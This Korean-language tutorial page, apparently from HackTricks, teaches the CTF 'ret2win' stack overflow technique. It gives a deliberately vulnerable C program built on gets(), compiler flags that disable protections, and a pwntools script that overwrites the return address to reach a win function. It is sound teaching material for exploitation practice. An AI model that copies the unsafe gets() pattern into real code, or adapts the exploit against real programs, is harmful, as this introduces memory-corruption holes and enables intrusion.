# Ret2win

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

**Ret2win** 챌린지는 **Capture The Flag (CTF)** 대회에서 인기 있는 카테고리로, 특히 **바이너리 익스플로잇**과 관련된 작업에서 그렇습니다. 목표는 주어진 바이너리의 취약점을 이용하여 바이너리 내에서 특정 호출되지 않은 함수를 실행하는 것입니다. 이 함수는 보통 `win`, `flag`와 같은 이름을 가집니다. 이 함수가 실행되면 일반적으로 플래그나 성공 메시지를 출력합니다. 이 챌린지는 일반적으로 스택에서 **리턴 주소**를 덮어써서 실행 흐름을 원하는 함수로 전환하는 것을 포함합니다. 다음은 예제를 포함한 더 자세한 설명입니다:

### C Example

취약점이 있는 간단한 C 프로그램과 우리가 호출하려는 `win` 함수가 있다고 가정해 보겠습니다:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
이 프로그램을 스택 보호 없이 컴파일하고 **ASLR**을 비활성화하려면 다음 명령어를 사용할 수 있습니다:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-m32`: 프로그램을 32비트 바이너리로 컴파일합니다(선택 사항이지만 CTF 챌린지에서 일반적입니다).
- `-fno-stack-protector`: 스택 오버플로우에 대한 보호를 비활성화합니다.
- `-z execstack`: 스택에서 코드 실행을 허용합니다.
- `-no-pie`: 위치 독립 실행 파일을 비활성화하여 `win` 함수의 주소가 변경되지 않도록 합니다.
- `-o vulnerable`: 출력 파일 이름을 `vulnerable`로 설정합니다.

### Python Exploit using Pwntools

익스플로잇을 위해 **pwntools**를 사용할 것입니다. 이는 익스플로잇 작성을 위한 강력한 CTF 프레임워크입니다. 익스플로잇 스크립트는 버퍼를 오버플로우하고 반환 주소를 `win` 함수의 주소로 덮어쓰는 페이로드를 생성합니다.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` 함수의 주소를 찾으려면 **gdb**, **objdump** 또는 이진 파일을 검사할 수 있는 다른 도구를 사용할 수 있습니다. 예를 들어, `objdump`를 사용하여 다음과 같이 할 수 있습니다:
```sh
objdump -d vulnerable | grep win
```
이 명령은 `win` 함수의 어셈블리를 보여주며, 시작 주소를 포함합니다.&#x20;

Python 스크립트는 정교하게 제작된 메시지를 전송하여, `vulnerable_function`에 의해 처리될 때 버퍼가 오버플로우되고 스택의 반환 주소가 `win`의 주소로 덮어씌워집니다. `vulnerable_function`이 반환될 때, `main`으로 반환하거나 종료하는 대신 `win`으로 점프하고 메시지가 출력됩니다.

## Protections

- [**PIE**](../common-binary-protections-and-bypasses/pie/index.html) **는 비활성화되어야** 주소가 실행 간에 신뢰할 수 있도록 하거나 함수가 저장될 주소가 항상 동일하지 않으며, `win` 함수가 로드된 위치를 파악하기 위해 어떤 누출이 필요합니다. 오버플로우를 유발하는 함수가 `read` 또는 유사한 경우, 반환 주소를 `win` 함수로 변경하기 위해 1 또는 2 바이트의 **부분 덮어쓰기**를 할 수 있습니다. ASLR의 작동 방식 때문에 마지막 세 개의 16진수 니블은 무작위화되지 않으므로, 올바른 반환 주소를 얻을 확률은 **1/16** (1 니블)입니다.
- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/index.html) 또한 비활성화되어야 하며, 그렇지 않으면 손상된 EIP 반환 주소가 결코 따라지지 않을 것입니다.

## Other examples & References

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
- [https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html](https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html)
- 32비트, ASLR 없음
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html)
- ASLR가 있는 64비트, 바이너리 주소의 누출 포함
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- 64비트, ASLR 없음
- [https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html)
- 32비트, ASLR 없음, 두 번의 작은 오버플로우, 첫 번째로 스택을 오버플로우하고 두 번째 오버플로우의 크기를 늘림
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32비트, relro, 카나리 없음, nx, pie 없음, `fflush` 주소를 `win` 함수로 덮어쓰는 포맷 문자열 (ret2win)
- [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
- 64비트, relro, 카나리 없음, nx, pie. `win` 함수를 호출하기 위한 부분 덮어쓰기 (ret2win)

{{#include ../../../banners/hacktricks-training.md}}
